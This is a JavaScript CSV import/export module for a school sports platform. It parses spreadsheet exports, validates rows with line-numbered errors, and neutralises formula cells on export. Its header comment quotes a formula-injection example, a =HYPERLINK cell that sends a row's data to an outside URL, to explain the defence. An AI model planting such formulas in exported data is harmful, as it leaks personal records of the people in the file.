/**
 * SCRBRD — CSV, both directions.
 *
 * A school with four hundred boys will not type them in. This is the
 * unglamorous piece that stands between a demonstration and a season, and it
 * has two dangers worth naming before any code.
 *
 * ON THE WAY OUT: A CSV CELL CAN BE A PROGRAM. Excel, Numbers and LibreOffice
 * all evaluate a cell beginning = + - or @ as a formula, so a player's
 * hometown typed as =HYPERLINK("http://…"&A1) becomes a live link that
 * exfiltrates the row when a bursar opens the file. The data in this platform
 * is entered by hundreds of people at schools and none of them are attackers,
 * which is exactly why this has to be handled here rather than trusted: the
 * one person who tries it will be trying it against a child's record.
 * neutralise() below is not optional and is applied to every exported cell.
 *
 * ON THE WAY IN: A CSV IS NOT A DATABASE. It has no types, no keys and no
 * constraints, and every one of those has to be reimposed on arrival. So the
 * import path here does two things the naive version does not: it VALIDATES
 * EVERYTHING BEFORE WRITING ANYTHING, and it reports per-row with the line
 * number the person is looking at in their spreadsheet.
 *
 * WHAT THIS MODULE DOES NOT DO is decide who may read or write anything. Parse
 * and serialise only. The export path runs through readResource() and the
 * import path through the ordinary write policies, both under the caller's own
 * principal — a bulk load is a thousand ordinary writes, not a bypass.
 */

/**
 * Parse a CSV into { header, rows }, rows being arrays of strings.
 *
 * Written out rather than taken from a dependency, because the awkward cases
 * are the whole job and a school's export from their existing system will hit
 * every one of them:
 *
 *   - a BOM, which Excel writes and which turns the first header into
 *     "﻿full_name" so the column silently vanishes
 *   - CRLF, LF and lone CR line endings, sometimes in one file
 *   - quoted fields containing commas, quotes ("" escapes one) and newlines
 *   - a trailing newline, which must not produce a final empty row
 *
 * Whitespace is NOT trimmed here and nothing is coerced. A parser that
 * silently tidied its input would be making decisions the caller cannot see;
 * the field mappers below trim, because trimming a name is a decision about
 * names.
 */
export function parseCsv(text) {
  if (typeof text !== "string") return { header: [], rows: [] };
  // The BOM, removed once, at the front, before anything looks at a header.
  const s = text.charCodeAt(0) === 0xfeff ? text.slice(1) : text;

  const rows = [];
  let row = [];
  let field = "";
  let quoted = false;
  let i = 0;
  let sawAny = false;

  const endField = () => { row.push(field); field = ""; sawAny = true; };
  const endRow = () => { endField(); rows.push(row); row = []; };

  while (i < s.length) {
    const c = s[i];
    if (quoted) {
      if (c === '"') {
        // "" inside a quoted field is one literal quote.
        if (s[i + 1] === '"') { field += '"'; i += 2; continue; }
        quoted = false; i += 1; continue;
      }
      field += c; i += 1; continue;
    }
    if (c === '"') { quoted = true; i += 1; continue; }
    if (c === ",") { endField(); i += 1; continue; }
    if (c === "\n") { endRow(); i += 1; continue; }
    if (c === "\r") {
      // CRLF and a lone CR both end the row. A file with mixed endings is
      // ordinary rather than exotic once two systems have touched it.
      endRow(); i += s[i + 1] === "\n" ? 2 : 1; continue;
    }
    field += c; i += 1;
  }
  // A trailing newline leaves nothing pending and must not add an empty row.
  if (field !== "" || row.length > 0 || (!sawAny && s.length > 0)) endRow();

  const header = (rows.shift() ?? []).map((h) => h.trim().toLowerCase());
  // Wholly blank lines are dropped: spreadsheets leave them behind constantly
  // and a school should not have to hunt for row 402 to be told it is empty.
  const body = rows.filter((r) => r.some((c) => c.trim() !== ""));
  return { header, rows: body };
}

/**
 * A cell that a spreadsheet cannot execute.
 *
 * The leading apostrophe is the standard neutralisation and is what every
 * spreadsheet reads as "this is text". Applied to = + - and @ and to the tab
 * and carriage-return forms, which some versions treat as a formula lead-in
 * too.
 *
 * A number is left alone — it is serialised from a real number, not from user
 * input, so it cannot carry a formula, and prefixing it would make every
 * exported figure a string that no spreadsheet will sum.
 */
export function neutralise(value) {
  if (value === null || value === undefined) return "";
  if (typeof value === "number" || typeof value === "boolean") return String(value);
  const str = String(value);
  return /^[=+\-@\t\r]/.test(str) ? "'" + str : str;
}

/** One field, quoted only where it has to be. */
function quote(cell) {
  const s = neutralise(cell);
  return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

/**
 * Rows of objects to CSV text.
 *
 * The column order is given rather than taken from the first row's keys: a
 * file whose columns move because one row happened to be missing a field is a
 * file nobody can diff against last term's.
 *
 * A BOM is written, and it earns its place: without it Excel on Windows reads
 * UTF-8 as the local code page, and every South African name with a diacritic
 * — Böhmer, Ngcobo's apostrophes, Zoë — arrives mangled in a document a school
 * then prints.
 */
export function toCsv(rows, columns) {
  const cols = columns ?? [...new Set(rows.flatMap((r) => Object.keys(r ?? {})))];
  const out = [cols.map(quote).join(",")];
  for (const r of rows) out.push(cols.map((c) => quote(pick(r, c))).join(","));
  // CRLF, because that is what a spreadsheet expects and what every reader
  // accepts.
  return "﻿" + out.join("\r\n") + "\r\n";
}

/**
 * A value for a column, flattened for a flat format.
 *
 * A date becomes a plain ISO day rather than a timestamp with a zone: a
 * birthday is a day, and 2011-04-07T22:00:00.000Z is that day in one timezone
 * and the day before in another. Objects become JSON rather than
 * "[object Object]", which is the shape of a column somebody deletes.
 */
function pick(row, col) {
  const v = row?.[col];
  if (v === null || v === undefined) return "";
  if (v instanceof Date) return v.toISOString().slice(0, 10);
  if (typeof v === "object") return JSON.stringify(v);
  return v;
}

/**
 * Map parsed rows onto objects, using a column specification.
 *
 * Returns { rows, errors, unknown }. NOTHING IS WRITTEN AND NOTHING IS
 * PARTIALLY ACCEPTED: the caller gets every row's verdict at once, because the
 * person on the other end has a spreadsheet open and wants to fix all four
 * mistakes in one pass rather than discover them one deploy at a time.
 *
 * Line numbers are 1-BASED AND COUNT THE HEADER, so the number reported is the
 * number in the left margin of their spreadsheet. Reporting the array index
 * would be correct and useless.
 *
 * `unknown` names columns in the file that the specification does not use. Not
 * an error — a school's export carries fifty columns and we want six — but
 * worth returning, because a header typo looks exactly like a column we chose
 * not to read, and only the person who wrote it can tell which.
 */
export function mapRows({ header, rows }, spec) {
  const errors = [];
  const out = [];
  const index = new Map(header.map((h, i) => [h, i]));
  const known = new Set(Object.keys(spec));
  const unknown = header.filter((h) => h && !known.has(h));

  const missing = Object.entries(spec)
    .filter(([col, def]) => def.required && !index.has(col))
    .map(([col]) => col);
  if (missing.length) {
    return { rows: [], errors: [{ line: 1, column: null,
      message: `the file has no ${missing.join(", ")} column` }], unknown };
  }

  rows.forEach((cells, n) => {
    const line = n + 2;              // +1 for zero-based, +1 for the header
    const obj = {};
    let bad = false;
    for (const [col, def] of Object.entries(spec)) {
      const raw = index.has(col) ? (cells[index.get(col)] ?? "") : "";
      const value = raw.trim();
      if (!value) {
        if (def.required) {
          errors.push({ line, column: col, message: `${col} is required` });
          bad = true;
        } else {
          obj[def.as ?? col] = null;
        }
        continue;
      }
      try {
        obj[def.as ?? col] = def.parse ? def.parse(value) : value;
      } catch (e) {
        errors.push({ line, column: col, message: e.message, value });
        bad = true;
      }
    }
    if (!bad) out.push({ line, values: obj });
  });

  return { rows: out, errors, unknown };
}

// ── Field parsers, each refusing rather than guessing ────────────────
//
// Every one of these throws with a sentence a school office can act on. "Row
// 84: born must be a date like 2011-04-07, not 07/04/2011" tells them what to
// change; "invalid input syntax for type date" does not.

export const asText = (max) => (v) => {
  if (max && v.length > max) throw new Error(`must be ${max} characters or fewer`);
  return v;
};

/**
 * A date, and ONLY in ISO form.
 *
 * 07/04/2011 is deliberately refused rather than interpreted. It means 7 April
 * in South Africa and 4 July in the United States, both readings are common in
 * files a school will send, and a silent guess puts a boy in the wrong age
 * group — which is the exact failure the squad-eligibility trigger exists to
 * prevent, arriving through a side door.
 */
export const asDate = (v) => {
  if (!/^\d{4}-\d{2}-\d{2}$/.test(v)) {
    throw new Error("must be a date like 2011-04-07 (day/month order is ambiguous and is not guessed)");
  }
  const d = new Date(v + "T00:00:00Z");
  if (Number.isNaN(d.getTime()) || d.toISOString().slice(0, 10) !== v) {
    throw new Error(`${v} is not a real date`);
  }
  return v;
};

export const asInt = ({ min, max } = {}) => (v) => {
  if (!/^-?\d+$/.test(v)) throw new Error("must be a whole number");
  const n = Number(v);
  if (min != null && n < min) throw new Error(`must be at least ${min}`);
  if (max != null && n > max) throw new Error(`must be at most ${max}`);
  return n;
};

export const asOneOf = (allowed) => (v) => {
  const hit = allowed.find((a) => a.toLowerCase() === v.toLowerCase());
  if (!hit) throw new Error(`must be one of ${allowed.join(", ")}`);
  return hit;                        // the canonical spelling, not theirs
};

/**
 * An email, checked loosely on purpose.
 *
 * A strict pattern rejects addresses that work, and the platform sends nothing
 * to these — they are a contact detail on a record, not a login. What this
 * catches is the actual mistake in a school's spreadsheet: a phone number in
 * the email column, or a name.
 */
export const asEmail = (v) => {
  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(v)) throw new Error("does not look like an email address");
  return v.toLowerCase();
};

export const asPhone = (v) => {
  const cleaned = v.replace(/[^\d+]/g, "");
  if (cleaned.replace(/\D/g, "").length < 9) throw new Error("is too short to be a phone number");
  return v;
};
